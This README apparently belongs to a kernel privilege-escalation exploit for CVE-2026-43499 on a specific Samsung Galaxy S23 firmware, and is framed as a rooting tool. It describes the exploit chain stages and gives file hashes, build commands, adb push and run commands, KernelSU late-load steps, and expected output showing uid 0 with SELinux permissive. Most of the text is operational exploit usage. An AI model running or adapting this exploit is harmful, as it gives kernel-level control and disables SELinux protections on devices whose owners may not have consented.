# SM-S911B FZE1 payload

Payload for the Galaxy S23 `SM-S911B` running firmware `S911BXXSAFZE1` and
kernel `5.15.189-android13-8-33413713-abS911BXXSAFZE1` only.

The MCAST build completes the full chain on real hardware, from both `adb shell`
and the Root My Galaxy app through the Shizuku shell bridge: tracefs KASLR
discovery (canonical data mode), controlled `mm_struct` collection, shaped SKB
reclaim, fake fops, configfs ARW, pipe physical read/write, root UMH, and the
KernelSU `ksud --late-load` handoff. The final `su` client reports `uid=0` with
context `u:r:ksu:s0`.

This profile is listed in the Root My Galaxy support feed. The proven launch
contexts are `uid=2000`, `u:r:shell:s0` (adb shell and Shizuku).

SIGRETURN is not offered for this target. The build is fixed to the
hardware-proven MCAST writer.

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `594a1173899d504e9efa2c19d32983926623a2c2dcdf2b5ac6cef34ea1d6b3cf` |
| `../../kernelsu/android13-5.15.189_kernelsu-dm1q-S911BXXSAFZE1.ko` | `d99f00dc26241cffb4d7fa4e920a739d8e0b91869ae329f7166a9711be52923f` |
| `../../kernelsu/ksud-dm1q-S911BXXSAFZE1-kdp` | `07302e5a79cc6c57d23a06cbb996c2f31c50c29589c03cf40278cfe43ab92639` |

The runner `cve-2026-43499-root` is built from `src/su_daemon.c` (SHA-256
`0762fc6ef84694ec4026292a5a618b8b40d2fbfc0ba9692e21ef4f66dc0e23b1`). It passes
`--allow-shell` to the `ksud` loader so `su` works from a shell (`uid 2000`).

## Build

```sh
make TARGET=dm1q-S911BXXSAFZE1 ANDROID_NDK_HOME=/path/to/android-ndk
```

Use these outputs:

```text
build/dm1q-S911BXXSAFZE1/cve-2026-43499-app.so
build/dm1q-S911BXXSAFZE1/cve-2026-43499-root
```

Do not set `SLIDE_P0_OFFSET`. The tracefs scan is required to reach the
canonical data mode; forcing an offset switches to the physical-alias mode and
fails at the fops slide with `cfi misc_fops mismatch`.

## ADB shell test

Wait about one minute after boot, then push the payload and runner:

```sh
adb push cve-2026-43499-app.so /data/local/tmp/dm1q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ksud-dm1q-S911BXXSAFZE1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp"
```

Run one attempt:

```sh
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 \
  EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm1q.so \
  /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm1q-fze1.log"
```

Verify root:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; whoami; getenforce'"
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
root
Permissive
```

## KernelSU late-load

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
adb shell "su -c id"
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

Do not start another attempt on the same boot after the stack-writer stage. A
failed post-writer attempt can leave PI state behind.

## APK / Shizuku

The Root My Galaxy app delegates the runner through Shizuku so the payload runs
as `u:r:shell:s0`. This is confirmed working on `SM-S911B`. Install KernelSU
Manager `v3.2.5` (package `me.weishu.kernelsu`) after the late-load to manage
root grants.
